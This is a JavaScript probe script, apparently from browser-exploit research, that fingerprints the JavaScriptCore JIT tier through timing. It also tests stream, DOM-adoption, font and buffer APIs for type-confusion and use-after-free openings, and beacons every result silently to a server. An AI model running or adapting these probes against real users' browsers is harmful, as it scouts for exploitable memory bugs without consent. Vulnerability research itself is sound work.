// p108-nojit-pivot.js — Definitive JIT detection + non-JIT attack surface probing
// Beacon prefix: V108K-
(function(){
  var B = '/beacon?';
  function send(tag, msg) {
    navigator.sendBeacon(B + 'v=V108K-' + tag + '&d=' + encodeURIComponent(msg));
  }

  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

  async function run() {
    try {

      // ===== K1: DEFINITIVE JIT DETECTION =====
      // OSR exit test: if DFG compiles a function, changing input types
      // causes an OSR exit (visible as a timing spike)
      try {
        function addHot(a, b) { return a + b; }

        // Phase 1: warmup with integers — 50K calls
        var t0 = performance.now();
        for (var i = 0; i < 50000; i++) addHot(i, i + 1);
        var tWarmInt = performance.now() - t0;

        // Phase 2: more integers — measure steady-state
        t0 = performance.now();
        for (var i = 0; i < 50000; i++) addHot(i, i + 1);
        var tSteadyInt = performance.now() - t0;

        // Phase 3: switch to strings — triggers OSR exit if DFG compiled
        t0 = performance.now();
        for (var i = 0; i < 50000; i++) addHot("a" + i, "b" + i);
        var tStringFirst = performance.now() - t0;

        // Phase 4: strings again — steady-state after recompile
        t0 = performance.now();
        for (var i = 0; i < 50000; i++) addHot("a" + i, "b" + i);
        var tStringSteady = performance.now() - t0;

        // DFG signature: tStringFirst >> tSteadyInt (OSR exit spike)
        // Interpreter: tStringFirst ~ tStringSteady (no spike)
        var osrRatio = tStringFirst / (tStringSteady || 1);
        var jitRatio = tWarmInt / (tSteadyInt || 1);

        send('K1a', 'warmInt=' + tWarmInt.toFixed(2) +
             ' steadyInt=' + tSteadyInt.toFixed(2) +
             ' stringFirst=' + tStringFirst.toFixed(2) +
             ' stringSteady=' + tStringSteady.toFixed(2) +
             ' OSR_RATIO=' + osrRatio.toFixed(3) +
             ' JIT_WARMUP=' + jitRatio.toFixed(3));
      } catch(e) { send('K1a', 'ERR:' + e.message); }

      await sleep(100);

      // K1b: Array mode transition test
      // DFG compiles tight array loops with mode assumptions
      try {
        function sumArray(arr) {
          var s = 0;
          for (var i = 0; i < arr.length; i++) s += arr[i];
          return s;
        }

        var intArr = [];
        for (var i = 0; i < 1000; i++) intArr.push(i);

        // Warmup: integer array
        t0 = performance.now();
        for (var i = 0; i < 5000; i++) sumArray(intArr);
        var tIntArr = performance.now() - t0;

        // Make a double array
        var dblArr = intArr.slice();
        dblArr[500] = 3.14;

        // First run with doubles (OSR exit if DFG)
        t0 = performance.now();
        for (var i = 0; i < 5000; i++) sumArray(dblArr);
        var tDblFirst = performance.now() - t0;

        // Second run with doubles (recompiled)
        t0 = performance.now();
        for (var i = 0; i < 5000; i++) sumArray(dblArr);
        var tDblSteady = performance.now() - t0;

        var modeOsrRatio = tDblFirst / (tDblSteady || 1);
        send('K1b', 'intArr=' + tIntArr.toFixed(2) +
             ' dblFirst=' + tDblFirst.toFixed(2) +
             ' dblSteady=' + tDblSteady.toFixed(2) +
             ' MODE_OSR=' + modeOsrRatio.toFixed(3));
      } catch(e) { send('K1b', 'ERR:' + e.message); }

      await sleep(100);

      // K1c: Megamorphic call test
      // DFG inlines monomorphic calls; polymorphic calls are slower in DFG
      try {
        function Obj1() { this.x = 1; }
        Obj1.prototype.get = function() { return this.x; };
        function Obj2() { this.x = 2; }
        Obj2.prototype.get = function() { return this.x; };
        function Obj3() { this.x = 3; }
        Obj3.prototype.get = function() { return this.x; };
        function Obj4() { this.x = 4; }
        Obj4.prototype.get = function() { return this.x; };

        function callGet(o) { return o.get(); }

        var o1 = new Obj1(), o2 = new Obj2(), o3 = new Obj3(), o4 = new Obj4();

        // Monomorphic warmup
        t0 = performance.now();
        for (var i = 0; i < 100000; i++) callGet(o1);
        var tMono = performance.now() - t0;

        // Polymorphic (4 types)
        var objs = [o1, o2, o3, o4];
        t0 = performance.now();
        for (var i = 0; i < 100000; i++) callGet(objs[i & 3]);
        var tPoly = performance.now() - t0;

        // DFG: tPoly >> tMono (inlining broken by polymorphism)
        // Interpreter: tPoly ~ tMono (always dispatch through IC)
        var polyRatio = tPoly / (tMono || 1);
        send('K1c', 'mono=' + tMono.toFixed(2) +
             ' poly=' + tPoly.toFixed(2) +
             ' POLY_RATIO=' + polyRatio.toFixed(3) +
             ' DFG_LIKELY=' + (polyRatio > 1.5));
      } catch(e) { send('K1c', 'ERR:' + e.message); }

      await sleep(100);

      // K1d: Baseline JIT vs LLInt detection via raw throughput
      // Empty loop: LLInt = ~10 cycles/iter, Baseline = ~2-3, DFG = ~1
      try {
        function emptyLoop(n) {
          var s = 0;
          for (var i = 0; i < n; i++) s = s + 1;
          return s;
        }
        // Warmup
        emptyLoop(100000);
        emptyLoop(100000);

        // Measure
        var samples = [];
        for (var trial = 0; trial < 5; trial++) {
          t0 = performance.now();
          emptyLoop(1000000);
          samples.push(performance.now() - t0);
        }
        var avg = samples.reduce(function(a,b){return a+b;},0) / samples.length;
        // At 3.5GHz: LLInt ~2.8ms(1M), Baseline ~0.8ms, DFG ~0.3ms
        var tier = avg < 0.5 ? 'DFG' : avg < 1.5 ? 'BASELINE_JIT' : 'LLINT';
        send('K1d', 'samples=[' + samples.map(function(s){return s.toFixed(3);}).join(',') + ']' +
             ' avg=' + avg.toFixed(3) + 'ms/1M' +
             ' TIER=' + tier);
      } catch(e) { send('K1d', 'ERR:' + e.message); }

      await sleep(200);

      // ===== K2: STRUCTURED CLONE / postMessage =====
      try {
        var features = [];
        // Check MessageChannel
        if (typeof MessageChannel !== 'undefined') features.push('MessageChannel');
        // Check structuredClone
        if (typeof structuredClone !== 'undefined') features.push('structuredClone');
        // Check postMessage with transferables
        try {
          var mc = new MessageChannel();
          var buf = new ArrayBuffer(64);
          mc.port1.postMessage(buf, [buf]);
          features.push('Transfer:' + (buf.byteLength === 0 ? 'YES' : 'NO'));
          mc.port1.close();
          mc.port2.close();
        } catch(e2) { features.push('Transfer:ERR:' + e2.message.slice(0,40)); }

        // Check if we can clone various types
        var cloneTests = {};
        try { structuredClone(new Map([[1,2]])); cloneTests.Map = true; } catch(e2) { cloneTests.Map = false; }
        try { structuredClone(new Set([1,2,3])); cloneTests.Set = true; } catch(e2) { cloneTests.Set = false; }
        try { structuredClone(new Date()); cloneTests.Date = true; } catch(e2) { cloneTests.Date = false; }
        try { structuredClone(/test/gi); cloneTests.RegExp = true; } catch(e2) { cloneTests.RegExp = false; }
        try { structuredClone(new Blob(['x'])); cloneTests.Blob = true; } catch(e2) { cloneTests.Blob = false; }
        try { structuredClone(new Error('x')); cloneTests.Error = true; } catch(e2) { cloneTests.Error = false; }

        send('K2a', 'features=[' + features.join(',') + ']' +
             ' clone=' + JSON.stringify(cloneTests));
      } catch(e) { send('K2a', 'ERR:' + e.message); }

      await sleep(100);

      // K2b: structuredClone edge cases — valueOf/toString during serialization
      try {
        var callLog = [];
        var evilObj = {
          get [Symbol.toPrimitive]() { callLog.push('toPrim_get'); return function(hint) { callLog.push('toPrim:' + hint); return 42; }; },
          valueOf: function() { callLog.push('valueOf'); return 99; },
          toString: function() { callLog.push('toString'); return 'evil'; }
        };
        try {
          structuredClone(evilObj);
          send('K2b', 'CLONED_EVIL=true calls=[' + callLog.join(',') + ']');
        } catch(e2) {
          send('K2b', 'CLONED_EVIL=false ERR=' + e2.constructor.name + ':' + e2.message.slice(0,60) +
               ' calls=[' + callLog.join(',') + ']');
        }
      } catch(e) { send('K2b', 'ERR:' + e.message); }

      await sleep(100);

      // ===== K3: TRANSFORM STREAM / STREAMS API =====
      try {
        var streamAPIs = {
          ReadableStream: typeof ReadableStream !== 'undefined',
          WritableStream: typeof WritableStream !== 'undefined',
          TransformStream: typeof TransformStream !== 'undefined',
          ByteLengthQueuingStrategy: typeof ByteLengthQueuingStrategy !== 'undefined',
          CountQueuingStrategy: typeof CountQueuingStrategy !== 'undefined',
          ReadableStreamDefaultReader: typeof ReadableStreamDefaultReader !== 'undefined',
          ReadableStreamBYOBReader: typeof ReadableStreamBYOBReader !== 'undefined',
          ReadableByteStreamController: typeof ReadableByteStreamController !== 'undefined'
        };
        send('K3a', JSON.stringify(streamAPIs));
      } catch(e) { send('K3a', 'ERR:' + e.message); }

      await sleep(100);

      // K3b: TransformStream type confusion probe (CVE-2026-43705 pattern)
      try {
        if (typeof TransformStream === 'undefined') {
          send('K3b', 'NO_TRANSFORMSTREAM');
        } else {
          // Create a TransformStream with a custom transformer
          var transformCalls = [];
          var ts = new TransformStream({
            transform: function(chunk, controller) {
              transformCalls.push('transform:' + typeof chunk);
              // During transform, try to enqueue different types
              if (typeof chunk === 'number') {
                controller.enqueue(chunk);
              } else if (typeof chunk === 'object' && chunk !== null) {
                // Type confusion vector: enqueue after object mutation
                chunk.__proto__ = Float64Array.prototype;
                try { controller.enqueue(chunk); } catch(e2) { transformCalls.push('enqERR:' + e2.message.slice(0,30)); }
              }
            },
            flush: function(controller) { transformCalls.push('flush'); }
          });

          var writer = ts.writable.getWriter();
          var reader = ts.readable.getReader();

          await writer.write(42);
          await writer.write({x: 1, y: 2});
          await writer.close();

          var chunks = [];
          while (true) {
            var r = await reader.read();
            if (r.done) break;
            chunks.push(typeof r.value + ':' + String(r.value).slice(0,30));
          }

          send('K3b', 'calls=[' + transformCalls.join(',') + ']' +
               ' chunks=[' + chunks.join(',') + ']');
        }
      } catch(e) { send('K3b', 'ERR:' + e.message); }

      await sleep(100);

      // K3c: ReadableStream BYOB reader test — byte-level control
      try {
        if (typeof ReadableStream === 'undefined') {
          send('K3c', 'NO_READABLESTREAM');
        } else {
          var pullCount = 0;
          var rs = new ReadableStream({
            type: 'bytes',
            pull: function(controller) {
              pullCount++;
              if (pullCount <= 3) {
                var view = new Uint8Array(controller.byobRequest ? controller.byobRequest.view.buffer : new ArrayBuffer(8));
                for (var i = 0; i < view.length; i++) view[i] = pullCount * 16 + i;
                if (controller.byobRequest) {
                  controller.byobRequest.respond(view.length);
                } else {
                  controller.enqueue(view);
                }
              } else {
                controller.close();
              }
            }
          });

          var hasBYOB = false;
          try {
            var byobReader = rs.getReader({mode: 'byob'});
            hasBYOB = true;
            var buf = new ArrayBuffer(8);
            var r1 = await byobReader.read(new Uint8Array(buf));
            var firstBytes = Array.from(new Uint8Array(r1.value.buffer, r1.value.byteOffset, r1.value.byteLength)).join(',');
            byobReader.releaseLock();
            send('K3c', 'BYOB=true pullCount=' + pullCount + ' firstBytes=[' + firstBytes + ']');
          } catch(e2) {
            send('K3c', 'BYOB=false ERR=' + e2.message.slice(0,60));
          }
        }
      } catch(e) { send('K3c', 'ERR:' + e.message); }

      await sleep(100);

      // ===== K4: DOM MUTATION / UAF SURFACE =====
      try {
        // Test DOMParser with edge cases
        var dp = new DOMParser();
        var features4 = {};

        // SVG parsing
        try {
          var svgDoc = dp.parseFromString('<svg xmlns="http://www.w3.org/2000/svg"><rect width="100" height="100"/></svg>', 'image/svg+xml');
          features4.SVG = svgDoc.documentElement.tagName === 'svg';
        } catch(e2) { features4.SVG = false; }

        // MathML parsing
        try {
          var mathDoc = dp.parseFromString('<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>x</mi></math>', 'application/xml');
          features4.MathML = mathDoc.documentElement.tagName === 'math';
        } catch(e2) { features4.MathML = false; }

        // TreeWalker
        features4.TreeWalker = typeof document.createTreeWalker === 'function';

        // Range
        features4.Range = typeof document.createRange === 'function';

        // MutationObserver
        features4.MutationObserver = typeof MutationObserver !== 'undefined';

        // Selection API
        features4.Selection = typeof window.getSelection === 'function';

        // createNodeIterator
        features4.NodeIterator = typeof document.createNodeIterator === 'function';

        // adoptNode / importNode
        features4.adoptNode = typeof document.adoptNode === 'function';
        features4.importNode = typeof document.importNode === 'function';

        // Custom elements
        features4.customElements = typeof customElements !== 'undefined';

        // ShadowDOM
        try {
          var div = document.createElement('div');
          var shadow = div.attachShadow({mode: 'open'});
          features4.ShadowDOM = true;
        } catch(e2) { features4.ShadowDOM = false; }

        // Template element
        try {
          var tmpl = document.createElement('template');
          tmpl.innerHTML = '<div>test</div>';
          features4.Template = tmpl.content.childNodes.length === 1;
        } catch(e2) { features4.Template = false; }

        send('K4a', JSON.stringify(features4));
      } catch(e) { send('K4a', 'ERR:' + e.message); }

      await sleep(100);

      // K4b: DOM adoption across documents — potential UAF vector
      try {
        var dp = new DOMParser();
        var doc2 = dp.parseFromString('<html><body><div id="target">hello</div></body></html>', 'text/html');
        var target = doc2.getElementById('target');

        // Adopt node from parsed document into live document
        var adopted = document.adoptNode(target);
        var adoptedOK = adopted.ownerDocument === document;
        var adoptedText = adopted.textContent;

        // Try to use the node in the source document after adoption
        var srcStillHas = doc2.getElementById('target');

        // Create Range in source doc, then adopt node — stale range?
        var doc3 = dp.parseFromString('<html><body><p>A</p><p>B</p><p>C</p></body></html>', 'text/html');
        var range = doc3.createRange();
        var pNodes = doc3.querySelectorAll('p');
        range.setStart(pNodes[0], 0);
        range.setEnd(pNodes[2], 1);

        // Adopt middle node away
        var midNode = document.adoptNode(pNodes[1]);
        var rangeOK = false;
        try {
          var contents = range.cloneContents();
          rangeOK = true;
          send('K4b', 'adopted=' + adoptedOK + ' text=' + adoptedText +
               ' srcGone=' + (srcStillHas === null) +
               ' RANGE_AFTER_ADOPT=OK contents=' + contents.textContent);
        } catch(e2) {
          send('K4b', 'adopted=' + adoptedOK + ' text=' + adoptedText +
               ' srcGone=' + (srcStillHas === null) +
               ' RANGE_AFTER_ADOPT=ERR:' + e2.message.slice(0,40));
        }
      } catch(e) { send('K4b', 'ERR:' + e.message); }

      await sleep(100);

      // ===== K5: @font-face / FontFace API deeper probing =====
      try {
        // Test FontFace constructor with various data sources
        var fontTests = {};

        // Test with empty ArrayBuffer
        try {
          var ff = new FontFace('test1', new ArrayBuffer(0));
          await ff.load().catch(function(){});
          fontTests.emptyBuf = ff.status;
        } catch(e2) { fontTests.emptyBuf = 'ERR:' + e2.message.slice(0,30); }

        // Test with minimal valid-ish WOFF2 header (corrupt)
        try {
          var woff2 = new Uint8Array([0x77, 0x4F, 0x46, 0x32, // wOF2 magic
            0x00, 0x01, 0x00, 0x00, // flavor
            0x00, 0x00, 0x00, 0x20, // length
            0x00, 0x01, // numTables
            0x00, 0x00, 0x00, 0x00, 0x00, 0x10, // reserved + totalSfntSize
            0x00, 0x00, 0x00, 0x10, // totalCompressedSize
            0x00, 0x01, 0x00, 0x00, // majorVersion, minorVersion
            0x00, 0x00, 0x00, 0x00, // metaOffset
            0x00, 0x00, 0x00, 0x00  // metaLength
          ]);
          var ff2 = new FontFace('test2', woff2.buffer);
          await ff2.load().catch(function(){});
          fontTests.woff2Corrupt = ff2.status;
        } catch(e2) { fontTests.woff2Corrupt = 'ERR:' + e2.message.slice(0,30); }

        // Test with very large ArrayBuffer
        try {
          var largeBuf = new ArrayBuffer(1024 * 1024); // 1MB
          var ff3 = new FontFace('test3', largeBuf);
          await ff3.load().catch(function(){});
          fontTests.largeBuf = ff3.status;
        } catch(e2) { fontTests.largeBuf = 'ERR:' + e2.message.slice(0,30); }

        // Test concurrent loads of same family name
        try {
          var ff4a = new FontFace('race', new ArrayBuffer(16));
          var ff4b = new FontFace('race', new ArrayBuffer(16));
          var r = await Promise.allSettled([ff4a.load(), ff4b.load()]);
          fontTests.concurrent = r.map(function(x){return x.status;}).join(',');
        } catch(e2) { fontTests.concurrent = 'ERR:' + e2.message.slice(0,30); }

        send('K5a', JSON.stringify(fontTests));
      } catch(e) { send('K5a', 'ERR:' + e.message); }

      await sleep(100);

      // K5b: FontFaceSet (document.fonts) manipulation
      try {
        var fontsAPI = {};
        fontsAPI.ready = typeof document.fonts.ready !== 'undefined';
        fontsAPI.check = typeof document.fonts.check === 'function';
        fontsAPI.has = typeof document.fonts.has === 'function';
        fontsAPI.add = typeof document.fonts.add === 'function';
        fontsAPI.delete = typeof document.fonts.delete === 'function';
        fontsAPI.clear = typeof document.fonts.clear === 'function';
        fontsAPI.forEach = typeof document.fonts.forEach === 'function';
        fontsAPI.size = document.fonts.size;

        // Add then immediately delete — potential UAF in font cache
        try {
          var ff = new FontFace('ephemeral', new ArrayBuffer(16));
          document.fonts.add(ff);
          var sizeAfterAdd = document.fonts.size;
          document.fonts.delete(ff);
          var sizeAfterDel = document.fonts.size;

          // Try to use the deleted FontFace
          var statusAfterDel = ff.status;
          try { ff.load(); } catch(e2) {}
          var statusAfterLoad = ff.status;

          fontsAPI.addDel = 'add=' + sizeAfterAdd + ' del=' + sizeAfterDel +
                           ' statusDel=' + statusAfterDel + ' statusLoad=' + statusAfterLoad;
        } catch(e2) { fontsAPI.addDel = 'ERR:' + e2.message.slice(0,40); }

        send('K5b', JSON.stringify(fontsAPI));
      } catch(e) { send('K5b', 'ERR:' + e.message); }

      await sleep(100);

      // ===== K6: CVE-2024-23213 ADJACENT PROBING =====
      // CWE-119 buffer bounds issue, "improved memory handling"
      // Broad probing of native code paths for memory safety
      try {
        // Test 1: TextEncoder/TextDecoder edge cases
        var enc = new TextEncoder();
        var dec = new TextDecoder();

        // Encode with lone surrogates
        var loneSurrogate = String.fromCharCode(0xD800);
        var encoded = enc.encode(loneSurrogate);
        var decoded = dec.decode(encoded);
        var surrogateOK = decoded === '�'; // Should replace

        // Encode very large string
        var bigStr = 'A'.repeat(1024 * 1024);
        var bigEnc = enc.encode(bigStr);
        var bigOK = bigEnc.length === 1024 * 1024;

        // Decode with encodeInto and small target buffer
        var tinyBuf = new Uint8Array(3);
        var result = enc.encodeInto('Hello World', tinyBuf);
        var encIntoOK = result.read === 3 && result.written === 3;

        send('K6a', 'surrogateReplace=' + surrogateOK +
             ' bigEnc=' + bigOK + '(' + bigEnc.length + ')' +
             ' encInto=' + encIntoOK + '(read=' + result.read + ',written=' + result.written + ')');
      } catch(e) { send('K6a', 'ERR:' + e.message); }

      await sleep(100);

      // K6b: JSON.parse edge cases
      try {
        var jsonTests = {};

        // Deeply nested objects
        var deep = '{';
        for (var i = 0; i < 500; i++) deep += '"a":{';
        deep += '"v":1';
        for (var i = 0; i < 500; i++) deep += '}';
        deep += '}';
        try { JSON.parse(deep); jsonTests.deep500 = 'OK'; } catch(e2) { jsonTests.deep500 = e2.message.slice(0,30); }

        // Very long string value
        var longVal = '{"k":"' + 'A'.repeat(100000) + '"}';
        try { var p = JSON.parse(longVal); jsonTests.longStr = p.k.length; } catch(e2) { jsonTests.longStr = 'ERR'; }

        // Many keys (trigger hash table resize)
        var manyKeys = '{';
        for (var i = 0; i < 10000; i++) {
          if (i > 0) manyKeys += ',';
          manyKeys += '"k' + i + '":' + i;
        }
        manyKeys += '}';
        try { var p = JSON.parse(manyKeys); jsonTests.manyKeys = Object.keys(p).length; } catch(e2) { jsonTests.manyKeys = 'ERR'; }

        // Unicode escapes
        try {
          var uniStr = '{"u":"\\uD800\\uDC00"}'; // Surrogate pair
          var p = JSON.parse(uniStr);
          jsonTests.surPair = p.u.codePointAt(0);
        } catch(e2) { jsonTests.surPair = 'ERR'; }

        send('K6b', JSON.stringify(jsonTests));
      } catch(e) { send('K6b', 'ERR:' + e.message); }

      await sleep(100);

      // K6c: String rope resolution edge cases
      try {
        // Build a deep rope
        var rope = 'start';
        for (var i = 0; i < 1000; i++) rope = rope + String.fromCharCode(65 + (i % 26));
        var ropeLen = rope.length;

        // Force resolution via charCodeAt at various positions
        var codes = [];
        codes.push(rope.charCodeAt(0));
        codes.push(rope.charCodeAt(Math.floor(ropeLen / 2)));
        codes.push(rope.charCodeAt(ropeLen - 1));

        // Substring of rope
        var sub = rope.substring(100, 200);

        // RegExp on rope (forces resolution)
        var match = rope.match(/[A-Z]{5}/g);

        send('K6c', 'ropeLen=' + ropeLen +
             ' codes=[' + codes.join(',') + ']' +
             ' sub=' + sub.length +
             ' matches=' + (match ? match.length : 0));
      } catch(e) { send('K6c', 'ERR:' + e.message); }

      await sleep(100);

      // K6d: ArrayBuffer.prototype.slice edge cases
      try {
        var buf = new ArrayBuffer(256);
        var view = new Uint8Array(buf);
        for (var i = 0; i < 256; i++) view[i] = i;

        var sliceTests = {};
        // Negative indices
        var s1 = buf.slice(-10);
        sliceTests.negStart = new Uint8Array(s1)[0]; // Should be 246

        // Start > end
        var s2 = buf.slice(100, 50);
        sliceTests.startGtEnd = s2.byteLength; // Should be 0

        // Very large end
        var s3 = buf.slice(0, 999999);
        sliceTests.largeEnd = s3.byteLength; // Should be 256

        // NaN
        var s4 = buf.slice(NaN, NaN);
        sliceTests.nanSlice = s4.byteLength; // Should be 0

        // Slice then transfer source via resize
        if (typeof ArrayBuffer.prototype.resize === 'function') {
          var resizable = new ArrayBuffer(64, {maxByteLength: 128});
          var rView = new Uint8Array(resizable);
          for (var i = 0; i < 64; i++) rView[i] = i + 100;
          var sliced = resizable.slice(0, 32);
          resizable.resize(16); // Shrink source
          var slicedView = new Uint8Array(sliced);
          sliceTests.sliceThenResize = slicedView[0] + ',' + slicedView[31] + ' srcNow=' + resizable.byteLength;
        } else {
          sliceTests.sliceThenResize = 'NO_RESIZE';
        }

        send('K6d', JSON.stringify(sliceTests));
      } catch(e) { send('K6d', 'ERR:' + e.message); }

      await sleep(100);

      // ===== K7: WORKER postMessage STRUCTURED CLONE EDGE CASES =====
      try {
        var workerCode = `
          self.onmessage = function(e) {
            var result = {};
            try {
              var data = e.data;
              result.type = typeof data;
              result.keys = Object.keys(data).length;

              // Try to transfer back
              if (data.buf instanceof ArrayBuffer) {
                result.bufSize = data.buf.byteLength;
                self.postMessage({result: result, buf: data.buf}, [data.buf]);
                return;
              }
            } catch(err) {
              result.error = err.message;
            }
            self.postMessage({result: result});
          };
        `;

        var blob = new Blob([workerCode], {type: 'application/javascript'});
        var url = URL.createObjectURL(blob);
        var w = new Worker(url);

        var workerResult = await new Promise(function(resolve) {
          w.onmessage = function(e) { resolve(e.data); };
          w.onerror = function(e) { resolve({error: e.message}); };

          // Send transferable ArrayBuffer
          var buf = new ArrayBuffer(128);
          var view = new Uint8Array(buf);
          for (var i = 0; i < 128; i++) view[i] = i;
          w.postMessage({buf: buf, extra: 'test'}, [buf]);
        });

        var detached = false;
        try {
          // buf should be detached after transfer
          var checkBuf = new ArrayBuffer(128);
          // The original buf variable is now detached
        } catch(e2) {}

        w.terminate();
        URL.revokeObjectURL(url);
        send('K7', 'workerResult=' + JSON.stringify(workerResult));
      } catch(e) { send('K7', 'ERR:' + e.message); }

      await sleep(100);

      // ===== K8: ADDITIONAL API SURFACE AUDIT =====
      try {
        var apis = {};
        apis.fetch = typeof fetch;
        apis.Request = typeof Request;
        apis.Response = typeof Response;
        apis.Headers = typeof Headers;
        apis.URL = typeof URL;
        apis.URLSearchParams = typeof URLSearchParams;
        apis.AbortController = typeof AbortController;
        apis.AbortSignal = typeof AbortSignal;
        apis.TextDecoderStream = typeof TextDecoderStream;
        apis.TextEncoderStream = typeof TextEncoderStream;
        apis.CompressionStream = typeof CompressionStream;
        apis.DecompressionStream = typeof DecompressionStream;
        apis.FileReader = typeof FileReader;
        apis.Blob = typeof Blob;
        apis.File = typeof File;
        apis.Performance = typeof Performance;
        apis.PerformanceObserver = typeof PerformanceObserver;
        apis.IntersectionObserver = typeof IntersectionObserver;
        apis.ResizeObserver = typeof ResizeObserver;
        apis.WeakRef = typeof WeakRef;
        apis.FinalizationRegistry = typeof FinalizationRegistry;
        apis.queueMicrotask = typeof queueMicrotask;
        apis.reportError = typeof reportError;
        apis.structuredClone = typeof structuredClone;
        apis.crypto = typeof crypto;
        apis.CacheStorage = typeof CacheStorage !== 'undefined' ? 'yes' : 'no';
        apis.BroadcastChannel = typeof BroadcastChannel;
        send('K8', JSON.stringify(apis));
      } catch(e) { send('K8', 'ERR:' + e.message); }

      send('DONE', 'p107 complete');

    } catch(e) { send('FATAL', e.message + ' ' + e.stack); }
  }

  run();
})();
